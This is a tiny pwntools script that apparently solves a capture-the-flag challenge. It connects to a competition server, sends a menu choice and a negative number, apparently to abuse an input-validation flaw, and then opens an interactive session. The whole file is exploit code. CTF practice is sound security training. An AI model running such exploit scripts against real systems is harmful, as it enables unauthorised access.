from pwn import *

target = remote("pwn.ctf.secso.cc", 5004)

target.sendline("3")
target.sendline("-2")
target.interactive()
